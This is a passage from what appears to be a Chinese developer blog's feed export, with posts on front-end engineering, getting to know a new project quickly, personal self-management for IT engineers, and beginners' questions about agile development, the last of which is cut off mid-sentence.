</p><p>总之，单页应用是一个独立的应用程序，而不是”堆砌的意大利面条的代码”。 </p></li></ol><p><em>工程化</em>  既然是独立的应用程序，为什么前端不能工程化。 我们的程序是需要运行在浏览器中，加上可能会使用ES6、Less等非原生的开发工具，就需要进行构建编译然后打包成能在浏览器上运行的程序。 这个过程在C/C++中有make，JAVA中有Maven。而前端的工程化生态比较分散，JavaScript的预处理语言、包管理工具、构建工具都有很多。 </p><p>前端的工程化需要考虑的有： </p><ol><li>合理的工程结构</li><li>工程构建</li><li>版本管理 </li><li>持续集成 </li></ol><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>前端的发展历史正是一个从网页设计到软件设计的过程，在这个过程中，开发者的思维需要发生彻底的变化。前端领域使用的技术越来越和其他平台的客户端贯通，例如Angularjs中的MVVM很大一部分从.net中学习到的；数据和视图分离，面向对象和函数式编程也是前端领域重要的思维；另外一个方面前端也在慢慢的影响其他领域，JavaScript的事件和异步等特性也让java世界发生变化。</p><p>我们不一定要成为全栈工程师，但需要拓宽技术眼界然后探究编程世界的内在本质，这样才能在学习和应用新的新的东西时得心应手，快速的在框架、平台、技术栈中切换。<br>就像在我们认为写AngularJS的时候，其实我们写的是JavaScript；当我们认为在写JavaScript的时，更多的需要意识到我们在编写可以被计算机运行的应用程序。 </p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开发者如何快速熟悉一个新项目</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/know-a-project-quickly/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/know-a-project-quickly/</url>
      
        <content type="html"><![CDATA[<p>在ThoughWorks有一句流传甚广的话 —— “在ThoughtWorks需要有拥抱随时准备变化的心态“，因为我们践行敏捷、我们有各种各样的客户，而商机稍纵即逝。作为普通的developer来讲，最明显的感受是不会像其他互联网公司一样长期待在一个项目，有足够的时间了解项目的上下文和背景。我们的项目周期足够短，甚至有时候几周都算很正常，项目的频繁切换对developer的要求就是需要快速了解一个新的项目。</p><p>这是我在ThoughtWorks几年间一直思考的一个问题，借博客大赛把我的一些想法发出来，这篇文章主要写给公司的新同学，另外权当抛砖引玉，欢迎进一步讨论。</p><p><strong>了解团队</strong></p><p>工作之前觉得项目上的”事“应该更重要，随着工作的时间越长，越能体会”人“对项目成功的决定作用更大。虽然有时候我们调侃某某项目坑“还是”不坑“，但是实际上了项目才知道，一个项目”坑“还是”不坑“取决于谁来做这个项目，因此我把这段放到了最前面。</p><p>站会应该是第一次接触到团队几乎所有人，在第一次站会的时候就应该去了解团队里面的所有的角色，以便在后面的工作中找到合适的人去开卡、desk check、关卡，需要注意不是所有的项目都有“全明星阵容”，往往有时候很多角色是兼任的，例如PM兼BA，BA兼UX等。</p><p>可以主动询问是否项目中有相关的on boarding的check list 快速了解一个这个团队的工作方式，每个项目的工作习惯有一定的差异，工作on boarding的文档可以快速的了解这些，例如需要怎么开卡、是否需要做desk check，提交代码时的comment规范是怎样的。</p><p>另外，主动寻找一个合适的人一起pair，一起pair来了解一个新的项目在ThoughtWorks是非常常规的操作，在刚到项目会给新人一些时间设置环境，熟悉代码，这个时候能熟练地老手一起pair几天可以说事半功倍。</p><p>还有一个重要的Tip就是，学会快速记住其他人的名字，这会让你更方便的融入团队和得到尊重。</p><p><strong>了解业务</strong></p><p>作为一个developer需要对业务整体的了解才能对单个故事卡有足够的理解，否则单个故事卡就是横看成岭侧成峰了。当然最直观的做法就是去找BA聊聊业务，不过在找BA之前比较好的建议是先找QA要一下测试或者UAT环境的地址和账号，作为一个普通用户的角色使用一遍，这样会从用户的角度有一个初步的认识。</p><p>在和BA过业务的时，BA 会把原型图拿出来，这个时候再结合之前自己对应用使用的印象来了解业务背后的逻辑。因为应不是所有的业务逻辑都能在原型图上得到体现，在实现过程中也会对最初的设计做一些小的调整。还有就是结合现有的功能看原型图，可以知道哪些已经开发完成哪些还在开发中，这样后面在自己开发过程中可以参考已经实现了的功能或代码。关于原型图另外一个Tip就是很多项目为了保持项目风格统一，会给出一个style guide来指定一个基本的样式规则，例如间距、字体、颜色等。</p><p>有时间可以整体过一下卡墙，看下项目工作到那个阶段和状态。很难有足够的时间细致的看完所有的故事卡，需要整体有一个映像即可，但是需要注意的是有些跨功能需求很重要但没有在故事卡上表现，因为跨功能需求是一些共同的、默认的需求，例如对表单进行验证、分页等，如果不注意这一点在开卡时可能会忽略，但是QA测试中会覆盖相应需求。</p><p>其他了解项目业务的方式还有阅读项目Inception报告和Wiki文档（如果有的话），Inception 报告的信息来自于Inception期间从客户得来的第一手资料。有时候会觉得有些很奇怪的需求（比如使用奇怪的存储媒介Excel而不是数据库，用户业务人员需要直接修改资料等），但是往往是因为一些既定背景下妥协的产物，这样就能理解客户的真实意图了。</p><p><strong>了解项目架构</strong></p><p>工程师习惯往往是第一时间打开代码，但是随着项目越来越规范化，一般来说都会被分成多个代码仓库。如果直接读代码有时候会很难整理理解项目的结构。如果项目提供了一些架构图、流程图可以拿来参考，如果没有我们也可以通过一些方法了解了解项目的架构然后尝试自己画一些图形来帮助自己了解项目。</p><p><strong>使用C4模型表现项目架构和依赖关系</strong></p><p>C4模型是一种层层递进展开的方式来描述项目结构（系统-容器-组件-类），避免把在绘制图形的时候把不同层级的实体放到一起，造成架构图看起来非常混乱。为了表达项目依赖关系，我们可以系统一级（即以每个系统为单位）；表达自身项目架构，用容器这一级。</p><p>例如：</p><p><img src="/自我管理/self-management/know-a-project-quickly/12577-20200412120333286.png" alt="img"></p><p>图片来源 <a href="https://c4model.com/#examples" target="_blank" rel="noopener">https://c4model.com/#examples</a></p><p>这个例子中虚线外部可以表达为系统之间的依赖关系，虚线内部为当前系统展开的各个组成部分。如果很复杂可以画在两个图中表现，当然系统中的每个部分可以进一步放大。</p><p>通过查看代码仓库中的配置文件可以很容易解项目的依赖情况，因为规范的项目都会把第三方依赖的信息放到配置文件中，便于根据不同的环境切换，不会硬编码到业务代码中。</p><p>考虑技术架构需要考虑：</p><ul><li>技术栈和第三方包依赖</li><li>依赖服务的调用关系</li><li>认证和授权服务</li></ul><p><strong>使用E-R模型表现数据库关系结构</strong></p><p>E-R图也称实体-关系图，关系型数据库的灵魂在数据模式之间的关系，通过这种方式达到数据的完整性、一致性、正确性。为了降低冗余和提高一致性就需要合理的拆分多个数据表。如果数据库比较大就很难理解实体之间的关系。因为我们可以使用实体-关系图来表现数据库的关系结构，一般来说实体-关系图也会画出属性，但是如果属性较多或者想重点体现关系我们可以也可以省略属性。</p><p><img src="/自我管理/self-management/know-a-project-quickly/12603-20200412120332515.gif" alt="img"></p><p><img src="/自我管理/self-management/know-a-project-quickly/12606-20200412120332870.jpeg" alt="img"></p><p>图片来源：<a href="https://www.aliyun.com/jiaocheng/1112566.html" target="_blank" rel="noopener">https://www.aliyun.com/jiaocheng/1112566.html</a></p><p><img src="https://note.youdao.com/yws/public/resource/3a41bf9e73ebf05eaac1e9ecf837cdda/xmlnote/4B54EC1BE5774F39B6B9AE5327B4DFA0/12603" alt="img"></p><p><strong>使用时序图表现关键逻辑</strong></p><p>如果遇到单个业务流程比较复杂，例如下单流程。前后端可能会发生多次API的调用情况，这种情况下使用UML的时序图就非常清晰了。</p><p><img src="/自我管理/self-management/know-a-project-quickly/12613-20200412120332807.png" alt="img"></p><p>图片无对应项目，仅作为案例展示</p><p><strong>再谈了解代码</strong></p><p>阅读代码时除了查看通常的代码逻辑之外，最好着重看下项目的配置相关的代码。例如Spring boot中使用@Config注解下的类，每个项目的不同点通常在这里，如果不清楚一些Bean的配置方式，往往会被一些简单的问题坑到。通常来说一些拦截器、过滤器都会放到配置相关的代码附近。对全局的配置多一些了解就可以避开一些奇怪的问题。</p><p>另外项目中的打包流程也很值得一看，比如gradle的build文件，前端的webpack相关的脚本。</p><p>有一些项目会有一个技术债务清单或者图表，了解下技术债务能避开一些重复的工作，因为有一些代码可能会被重构或弃用，我们没有必要再在这些代码之上做修改。</p><p><strong>了解DevOps</strong></p><p><strong>项目中DeveOps的check list</strong></p><p>项目中的DeveOps工作很琐碎，但是如果了解这些信息，对上线、调试都有很多帮助，这里不一一展开，只是提供了一个清单说明一般的项目都会有那些DeveOps相关的内容。</p><ul><li><p>Dev、QA、UAT、Prod等多环境</p></li><li><p>CI/CD</p></li><li><p>代码仓库</p></li><li><p>Artificts 的存储</p></li><li><p>密匙管理</p></li><li><p>部署脚本</p></li><li><p>安全扫描工具</p></li><li><ul><li>Findbugs</li><li>Sonarqube</li></ul></li><li><p>定时任务</p></li><li><p>备份</p></li><li><p>日志</p></li></ul><p><strong>使用网络拓扑图表现部署情况</strong></p><p>当我们遇到一些线上问题，想要进行调试，或者准备上线的时候。需要知道网络和服务器相关的情况，这个时候可以通过网络拓扑图来描述应用的部署情况。</p><p><img src="/自我管理/self-management/know-a-project-quickly/12620-20200412120332735.png" alt="img"></p><p><strong>了解项目进展</strong></p><p>我把了解项目这部分放到了最后，因为在团队中有PM和Teach Lead 对项目整理方面更为关心。随着对项目的了解，了解一些项目管理方面的情况也必不可少，至少了解一些重要的时间点很必要。</p><ul><li>Release 时间 - 顾名思义，上线发布的时间</li><li>UAT 时间 - 上线前在UAT环境做准备的时间</li><li>Code freeze 时间 - 锁定代码或者创建新的分支不再提交新的功能，但是可以继续修改缺陷</li><li>Show case 时间 - 给客户演示阶段性成果的时间</li></ul><p>这些时间点串起来基本上就是一个项目的Flight plan。</p><p>在项目管理中，干系人管理作为很重要的一部分，因为客户方往往不可能只会接触一个人。声音大的、要求多的不一定最终拍板，经常不出现的也有可能是能做出重要决定的人。但对developer来说如果需要和客户其他系统对接，最重要的是找到几类人：</p><ul><li>技术对接人</li><li>UAT或上线验收的人</li></ul><p><strong>总结</strong></p><p>这边文章基本上属于check list 类型的“水”文，但是还是决定发出来。交付时间就是实打实的金钱，如果做到让新成员快速上手最重要的还是要团队的敏捷实践做的足够好、代码足够规范、文档足够完善。尽量避免在人员的切换带来的上下文丢失，团队交流也不能只是口口相传，更不能让某些关键的信息成为“单点故障”，应该及时的传递到整个团队。</p><p><strong>附录</strong></p><ol><li><a href="https://c4model.com/" target="_blank" rel="noopener">https://c4model.com/</a> 用于软件架构的C4模型</li><li><a href="https://www.gliffy.com/" target="_blank" rel="noopener">https://www.gliffy.com/</a> 一款在线绘图工具（国际）</li><li><a href="https://processon.com/" target="_blank" rel="noopener">https://processon.com/</a> 一款在线绘图工具（国内）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>软件工程自学课程资料</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/self-study-plan/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/self-study-plan/</url>
      
        <content type="html"><![CDATA[<p>网易计算机体系图：</p><p><a href="http://study.163.com/curricula/cs.htm" target="_blank" rel="noopener">http://study.163.com/curricula/cs.htm</a></p><p><img src="/自我管理/self-management/self-study-plan/image-20200412115853657.png" alt="image-20200412115853657"></p>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IT工程师的自我管理</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/self-management-for-developer/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/self-management-for-developer/</url>
      
        <content type="html"><![CDATA[<p>工作多年，我们见识到了很多厉害的人，他们可以兼顾家庭和工作，合理安排自己的事务和时间，能冷静的处理突发事件且理智的做出决策，把所有事情安排的妥妥当当。最初我以为这种能力来源于性格、情商甚至是天赋，因为并没有看到任何一本书来教人们做到这些，直到我把视角从普通的生活移到工作中，才发现原来一个能把生活安排的井井有条的人，在工作中往往也是优秀的管理者。</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/2927459226.jpg" alt="thinking.jpg"></p><p>管理项目或公司和管理生活有很多共通之处。有些人天生做的很好，但是像我这种普通人则不然。庆幸的是，我们依然能找到一些可行的方法和工具来做的像他们一样，在这篇文章中，我会尝试把公司项目管理的各种方法应用到个人生活中，我划分了不同的小节（收集反馈、决策、时间和任务管理、情绪管理）来阐述这些问题和解决方案，在每个小节的结尾，也会附上我使用过或者推荐的一些工具。</p><h2 id="收集反馈和接纳自己"><a href="#收集反馈和接纳自己" class="headerlink" title="收集反馈和接纳自己"></a>收集反馈和接纳自己</h2><p>在ThoughtWorks，我学到了一个非常有用的方法，并且可以用到生活中。我们称之为“Feedback”，中文含义为反馈。在公司，收集“Feedback”的精神无处不在，完成一个项目、甚至完成了一次公司内部活动，都会有同事发出调查表单或者邮件来收集意见和反馈。反馈，可以给我们提供改进的方向。</p><p>在团队里面，领导或者同事确实会站在不同的角度给予你“Feedback”。在此之外，也可以尝试自我反馈，甚至主动向别人索取反馈。我定了一个日历，来提醒自己在每周一晚上对反馈进行整理。在这小段时间里，让“我”不单单是我，想象自己是另外一个独立的个体，方能更客观和理性的认识自己。</p><p>在收集反馈和自我审视当中，非常重要的一点就是客观的接纳自己，从心理学的角度看，更好的安排和管理自己的生活也应该从接纳自己开始，接纳自己的优点或者缺点才能积极的坚持和改变，把一副一般的牌打出精彩效果，这就是管理的哲学。接纳自己的过程和项目经理第一天接手一个遗留项目的感受是一样的，无法改变的东西很多，例如deadline、经费，而能改进的东西更多，像团队热情、开发效率和交付质量等。</p><blockquote><p>优柔寡断、缺乏专注，但是也对很多东西充满热情；和人聊天不够站在对方考虑，但有时候也会幽默；拖延，但是还算勤奋。</p></blockquote><p>这是我给自己的评价，通过这种审视和接纳，我应该能回答一些问题：自己不能改变什么？我能改变什么？哪些事我能做的更好？更进一步，也可以从自己有什么价值、优势和劣势、未来的计划和发展方向、风险怎么管控和人际关系等方面审视自己。</p><p>我买了一个白板贴到家里墙上，用来写一些需要经常提醒自己的内容。很简单的一个物件，你可以在淘宝上买到，卖家一般还会赠送黑板擦和白板笔。可以记录你想到的每一个idea和自己的计划、任务清单，甚至给自己写一个座右铭作为自己的slogan。白板在公司非常常见，放在家里可以作为自己的可视化工具，通过写下需要的思考的问题可以打开一个“上帝视角”，帮助我们更为客观的思考。</p><h2 id="像公司一样决策"><a href="#像公司一样决策" class="headerlink" title="像公司一样决策"></a>像公司一样决策</h2><p>一直很好奇大的公司甚至政府是怎样做出好的决策的，普通人往往是在心里合计一下，然后拍个脑门就成，然而决策每天都在发生，小到出门要不要带伞，见女朋友需不需要买礼物，大到购置资产，投资理财，结婚买房等。“拍脑门决定”显然不是适用于所有场景的。</p><p>这里想提一个有意思的东西——易学，周易的功能之一是被古代政府用来决策事务，我曾经了解过一门叫做《奇门遁甲》的易学，这种方法是绘制一张格局图，用天干代表你周围的人际关系、资源，而“甲”就是自己，“遁甲”的意思是需要把自己放到一个客观的位置上来看待，方才能清晰的看待形势和做出正确的决策。</p><p>现代管理学中同样对“决策”十分重视，有很多书来阐述这个问题，甚至专门的决策学。其中有一个简单思维工具叫做SWOT，SWOT分析法（也称TOWS分析法、道斯矩阵）即态势分析法，20世纪80年代初由美国旧金山大学的管理学教授韦里克提出，经常被用于企业战略制定、竞争对手分析等场合。</p><p>举个例子来说明如何使用这个方法，如果我们需要考虑换工作（毕竟换工作对于任何人来说都是一件重要的事情），根据SWOT我们可以绘制一张表格来对比：</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/2147975733.png" alt="swot.png"></p><p>SWOT分析法</p><p>最后需要注意的就是别忽略沉没成本在一次决策中的影响，沉没成本是一个经典的经济学概念，通俗来说沉没成本就是已经投入的资源。比如一项商务谈判，前期付出的越多，后期也就越难放弃。有意思的是，沉没成本在恋爱中的效应同样明显，爱一个人越多，投入越多，则越难割舍。</p><p>对于一般来说，这种分析已经让做出选择的各项因素非常清晰，如果还是问题更加复杂，我们可以为每一项增加权重来做更为细致的思考，当然也更加复杂和浪费时间。因为做出决策本身也是需要成本的，当然也不应该在决策上花了太多的时间，没有完美的决策，简单的事情还是拍脑门儿吧。</p><h2 id="任务和时间管理"><a href="#任务和时间管理" class="headerlink" title="任务和时间管理"></a>任务和时间管理</h2><p>时间就像海绵，挤挤就有的。我宁愿相信这句话是谎言、鸡汤和毒药，如果时间可以被挤出来，无非两种情况，其一是其他的安排或者娱乐时间被无情的侵占了，其二是你做事的质量被降低了，如果你在洗碗，那么可能不会洗的太干净。</p><p>时间需要被管理，任务需要被有序安排。大量的时间管理书籍证明了这一点，去年流行的《暗时间》写的非常好，书中讲述了作者大量的经历和管理时间的方法。</p><p>我更愿意把时间管理和任务管理结合到一起，在工作中我们的项目经理也是这样做的，任务管理是项目经理非常重要的一部分，不过我们用的是针对项目的敏捷开发/瀑布流方法，更为复杂和需要团队参与，对于个人而言需要更简化的方法，分为几个步骤：</p><ol><li><p><strong>任务拆分。</strong> 拆分任务使得任务变得更简单可行是众所周知的方法，在笛卡尔的《谈谈方法》中，拆分已经被当做西方哲学和做事思想的内核。</p></li><li><p><strong>评估价值。</strong> “评估这项任务是不是真的有价值去做”也许是浪费时间的行为，为什么还需要去做。然而我之前做了很多这种无用的事情，还不如打一把王者荣耀。</p></li><li><p><strong>优先级排序。</strong><br>我们要把时间挤挤留给优先级高的事情，那么首先我们需要对任务进行排序。</p></li><li><p><strong>时间控制。</strong><br>每个任务需要预估时间，以便于我们留出一段合适的时间用而不至于被中途打断。</p></li></ol><p>为了管理这些任务，在公司我们有看板，对于个人而言推荐使用一些Todo List 工具。我偏向使用Chrome<br>上的插件，工具越简单越好，当然很多笔记工具都带有TODO列表。比如印象笔记、有道笔记，或者任何支持Markdown语法的编辑器，如果没有找到合适的工具，给自己桌子上贴一张便笺也行。</p><p>如果TODO列表工具有提醒的功能就更完美了，如果没有可以使用一些提醒工具，比如iPhone的手机提醒、Mac上的Calendar APP、适合国人使用习惯的QQ邮箱甚至提醒到微信和手机短信。</p><p>在做事的时候，专注可以提高效率，因此一个很有名的工作方法叫做番茄工作法被提出来。这种工作方法因一个番茄形状的厨房用定时器得名，手机上有大量相关应用可以下载。使用该软件可以让你在专注工作25分钟，随后有5分钟的休息时间，但25分钟内你需要保持高度精神集中，了解更多番茄工作法可以阅读《番茄工作法图解》一书。</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/2843315657.png" alt="tomato-working.png"></p><p>番茄工作法一书封面</p><h2 id="知识体系和储备"><a href="#知识体系和储备" class="headerlink" title="知识体系和储备"></a>知识体系和储备</h2><p>我是一个程序员，程序员都有一个焦虑，那就是总有一大堆新的技术和工具等着你去学。几个月前我尝试思考如何解决这个问题，随着IT从业者工作的时间的增加，年龄渐长，同时还要面临家庭和其他方面的事务，越来越不可能把所有精力投入到技术的学习中（毕竟还要学习如何预防颈椎病）。</p><p>通过观察一些技术强势、但业余爱好也开展的红红火火的IT大拿，发现几点非常有意思的事情。</p><p>不同技术创造的价值不同。我们经常谈论是需要专才还是通才，是需要精通某项技术还是博古通今，这种思考方向还是略显片面。无论是刻意还是偶然，有些技术能学习投入更少但是赚更多的钱，学习技术也需要眼光。不得不承认，从一般趋势下，web前端需要了解一堆繁杂的知识但是没有java等后端开发薪资高。</p><p>知识像一棵树，需要具备一个体系。这条经验不仅仅适用于IT行业，我们在学习某些东西时，会去网上寻找各种知识清单、书单、技能图谱，我在之前的文章中也介绍过IT行业相关的图谱。对于人脑而言，记忆和学习是线性或者网状的，这也符合我们的认知，零散的知识非常容易遗忘。构建体系的知识，我强烈推荐画图，无论是思维导图（Xmind、MindMap）还是鱼骨图、组织架构图和韦恩图都是很好的方法，甚至构建自己的技术雷达。</p><p><img src="http://www.printf.cn/usr/uploads/2019/02/1067394664.png" alt="tech-radar.png"></p><p>构建自己的技术雷达</p><p>知识需要储备、学习需要有文档产出。在完成一个项目或调研后，公司都会产出一定的文档，每个专业公司都有这样一个资料库，当我们遇到问题的时候可以从中找到相关信息。在工作中我曾经用过禅道、金山云、confluence等，相比之下，禅道不仅仅是一个文档管理工具，更是一个项目管理工具，而金山云文档搜索功能略差，confluence则是一个专业的团队文档管理工具，但是需要付费。</p><p>对于个人也一样，学习任何东西都需要有产出，在记笔记之外，写作是一个不错的方式，开通博客或者专栏来让学到的知识能够更好的沉淀，因此我整理了一个在线写作平台的清单：</p><p>国内篇</p><ul><li>点点轻博客</li><li>简书</li><li>博客园</li><li>知乎专栏</li></ul><p>国际篇</p><ul><li>WordPress</li><li>Gitbook</li><li>Wix</li><li>Blogger</li></ul><p>就文档管理而言，如果不希望自己的文档被发布出去，或者认为某些资料不是通常意义上的博客，使用Wikidot编写自己的Wiki来管理文档也不错。如果是程序员的话直接使用Github做文档管理或者给自己搭建一个Wiki，也不是非常难的一件事。</p><p>我自己偏爱用Markdown格式来管理自己的文档，因此创建了一个代码仓库用来放置所有文档，然后Hexo发布到github提供的静态资源服务器上供自己查看，有了这些工具和输出之后，我们能知道哪些知识是我们需要的，哪些知识暂时不需要但是在需要的时候能被快速的捡起来。</p><h2 id="情绪管理"><a href="#情绪管理" class="headerlink" title="情绪管理"></a>情绪管理</h2><p>在第一家公司工作时，我们老板讲了一个故事，曾经因为产品出现问题，很多下级经销商上门闹事要求退款，大多数人情绪十分激动，甚至有人打砸物品，都被老板一一化解。后来来了一个年轻的经销商，笑眯眯的来到公司，淡定非凡，和老板重新聊合同和赔偿的事务，这个人看起来并不生气，只是索取了大量相关资料。据老板讲，这个人应该在收集证据和资料用于后面走法律途经，因为是我们理亏，所以老板做出了让步、答应了他全部的退款条件。</p><p>我不知道人类演化出“抱怨”“气愤”“愤怒”等情绪的意义在哪里。当我们在工作中遇到麻烦，第一反应是抱怨；当别人指出我们的错误时，往往第一个动作是怼回去；遇到矛盾，我们会被激怒。但是当我们回顾这些行为本身，会发现抱怨对工作毫无益处，怼回别人的意见对自己也并没有帮助，即使在一场战斗中被激怒的一方往往会处于险镜。</p><p>我曾经看过一本书叫《不抱怨的世界》，书中提到一个很好的方法来减少抱怨：佩戴一个手链或者手环，当你意识到自己在抱怨时，交换手环到另外一只手，通过这种微小的心理暗示来矫正自己的不良过激反应。</p><p>生气是人的本能，没有谁能完全控制自己，一个好的建议是当我们感到愤怒的时候，请不要做任何行动和决策，先让自己安静下来至少30分钟。心理学上对于不良情绪的管理建议不要对抗不良情绪，而接纳和发泄是更为可行的办法，避免形成强迫行为，我们的目的不是消除负面情绪，而是不让情绪影响到决策，然后使用其他途径进行发泄和疏导。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>很多时候，管理这个词用到个人身上略显奇怪，对大多数人而言，管理知识如同屠龙之技。其实当把管理的各种方法用到生活中，管理并不是权利、控制和压迫，而是理性思考、引导和推动。管理并不一定是对下属，甚至可以管理上级、爱情和家庭，用各种可以学到的方法、技巧把生活打理的仅仅有条。就像古人“修身齐家治国平天下”，“修身”不正是管理自己么。限于篇幅，我们能从公司运作和管理的哲学中学到更多，希望后面有机会分享给大家。</p>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>回答敏捷初学者的个7个问题</title>
      <link href="/team/team/why-need-agile/"/>
      <url>/team/team/why-need-agile/</url>
      
        <content type="html"><![CDATA[<p>在一次敏捷课程上，学员问了我大量关于敏捷的问题，例如 “通过敏捷会让项目开发进度更快吗？”。其中一些也是几年前我想问的，并带着这些问题加入 ThoughtWorks。终于经过各种海内外敏捷项目，在一线开发有了对敏捷更为深刻的认识，现在回过头来聊一聊这些问题。</p><h2 id="为什么要敏捷？"><a href="#为什么要敏捷？" class="headerlink" title="为什么要敏捷？"></a>为什么要敏捷？</h2><p>敏捷作为一种软件开发方法，或者项目管理方法，很容易被说的玄乎。软件开发一定要敏捷才行吗？实际上很多项目是可以不采用敏捷开发方法的。</p><p>在很多年前的典型、银行领域，银行的软件主要是给行内内部使用的。那个时候的软件开发采用瀑布模型，把软件开发过程划分为需求、分析、设计、开发、测试等不同阶段。这种开发方式同样也能完成所有的任务，甚至这种开发方式延续至今。瀑布模型从出现到持续到现在已经有很长时间，包括目前大学的软件工程专业的课程内容也主要采用这种方式。</p><p>另外一种开发方式被大家所忽略，就是一些创业公司或者小团队的开发模式是 “伪敏捷” 的开发方式。实际上，这种状况是既不 “敏捷” 又不“瀑布”，是一种混乱或者无序的开发模式。用CMMI成熟度来描述可能还存在于 “初始级”，其软件开发过程是无序的，对过程没有定义，成功取决于个人努力或偶然。</p><p>几十年前，随着软件复杂性日益增高，无序的这种开发方式不能满足需要，于是有了瀑布模型；但是到了今天随着互联网发展，软件的需求来源变得越来越不稳定，原来的瀑布模型的一个过程太长了，于是敏捷开发方式出现了。</p><p>敏捷开发方式和瀑布都有过程上的定义和管理，并不是说“响应变化”就瞎变化。而是通过迭代将瀑布模型分隔成更小的周期，从而实现迭代。</p><p><img src="/team/team/why-need-agile/3536550679.png" alt="agile.png"></p><p>在敏捷开发过程中，每一次迭代时间可能是2周。每个迭代都能都有交付的工件，如果交付物不能满足市场或客户需求。可以在下一个迭代再一次进行分析、调整和开发，从而响应变化。</p><h2 id="敏捷会让项目更快吗？"><a href="#敏捷会让项目更快吗？" class="headerlink" title="敏捷会让项目更快吗？"></a>敏捷会让项目更快吗？</h2><p>答案是又不是。</p><p>先说不是的情况。项目更快不是那种开发方式来决定的，项目进展快的另外一个意思是时间用的更少。项目管理有一个共识，就是项目的成本（投入资源的数量）、时间、范围和质量，构成了一个矛盾的三角。</p><p>在相同的资源投入下，项目进度由范围、质量影响。通俗的来说，当一个项目人力资源匮乏时，一个人被当做两人使的时候，敏捷解决不了任何问题。</p><p><img src="/team/team/why-need-agile/2553244784.jpg" alt="project-angle.jpg"><br>甚至更糟糕的是，由于把一个长周期的开发过程，分割成了多个迭代，敏捷这种开发方法还要付出额外的开销。本来只需要整个周期开一次的会议，变成了每个迭代都需要开一次；迭代与迭代之间的融合也有额外的开销。如果适应了瀑布方法的团队，切换到敏捷工作方式后，开会的习惯还是和原来一样冗长就会是一个灾难。因为瀑布模型是一个从一而终的方法，所以必须要有完善的文档和详细的设计防止返工。但是敏捷团队按照同样的方式做的话，就变成了 “白天搞敏捷，晚上修 bug”，敏捷不仅不能让项目进展更快，而让拖慢项目，甚至导致项目失败。</p><p>再来说是的情况，敏捷这种开发方法确实能加快项目进度。其中一个重要的原因是加快了团队互动的频率和资源调度。怎么讲呢，在瀑布模型下，进度的安排会依赖一种叫做甘特图的工具。使用甘特图来排期，有两个问题：一个是某个人效率低下或请假会较大的影响整体进度，另外一个是下游工作等待时间长。</p><p><img src="/team/team/why-need-agile/2019699472.jpg" alt="gant.jpg"></p><p>在一个非常长的周期内，瀑布这种模型会产生严重的资源闲置和浪费。比如按照计划1个月完成开发工作，然后1周完成测试工作。那么测试团队需要一个月后才能接手测试工作，有很长的空窗期。敏捷方法把周期缩短了，那么测试团队就可以在迭代内相应的缩短空窗期，另外这个空窗期也可以拿来做一些准备工作（比如测试用例的编写）。</p><h2 id="敏捷会让项目提高效率吗？"><a href="#敏捷会让项目提高效率吗？" class="headerlink" title="敏捷会让项目提高效率吗？"></a>敏捷会让项目提高效率吗？</h2><p>在资源投入不变的情况下其实上面的问题已经反映了效率。另外在补充一点敏捷方法关于效率的讨论，根据上面的聊到的，敏捷实际上不能平白无故的让效率变高，也不能让一个人干出两个人的活儿。</p><p>在实际工作中我们发现，敏捷方法实际上是在看不见的地方提高了效率。最大的地方就是避免返工。</p><p>几年前在一个比较大的上市传统企业研发中心待过，我们尝试过把一些工作进行外包。实际上效果并不好，因为管理外包带来的成本有时候还不如自己做。其中一次，我们把前端页面外包给一个团队，我们负责出图，他们负责写出HTML+CSS。这个团队隔一周就会给我们反馈进度，一切都很正常。但是最终交付的时候我们拿到代码傻眼了，这份代码全是用Table布局的，对我们来说根本没用，于是只能返工。</p><p>对于较大型的软件项目来说可能更糟糕，一个大的瀑布模型，即使做了充分的设计、讨论，最终返工的概率非常大。因为瀑布模型是从传统行业，例如建筑业吸收而来，建筑行业的变化并不大、并且是一个可重复过程的行业，同时并不具备重构和修改的能力。但是软件行业完全不同，或者说以前的软件行业可以按照这种方式做，但现在互联网化的产品便不再适应了。</p><p>敏捷软件开发的核心逻辑是快速迭代，同时也具备了快速试错。那么敏捷能避免返工吗？</p><p>当然还是不能，但让返工的影响降低到最低，就已经是巨大的成功了。</p><h2 id="创业公司适合敏捷吗？"><a href="#创业公司适合敏捷吗？" class="headerlink" title="创业公司适合敏捷吗？"></a>创业公司适合敏捷吗？</h2><p>先说结论，创业公司更适合敏捷开发。</p><p>创业团队最大的优势是什么？船小好调头，人少好沟通。那么创业团队的弱势是什么呢？缺少战略基础，大部分时间在打游击战。因此创业公司适合一个灵活、轻量级的软件开发方法。</p><p>敏捷是一种轻量级的开发方法和理念，轻文档重合作，适合规模不大的团队，充分利用沟通成本低的优势 。通过迭代开发响应变化，每一个迭代能快速上线 验证产品设计是否合理。</p><h2 id="所有项目都适合敏捷吗？"><a href="#所有项目都适合敏捷吗？" class="headerlink" title="所有项目都适合敏捷吗？"></a>所有项目都适合敏捷吗？</h2><p>不是所有的项目都适合使用敏捷开发，但趋势是越来越多的项目适合使用敏捷，甚至不得不敏捷。</p><p>《大教堂与集市》中谈到，我们以为软件行业是制造业，实际上是服务业。和软件行业中很像的行业有两类，一种是能被重复的、不容易改变的、过程可控的，例如建筑行业。另一种是不能被重复的、可以改变的、过程 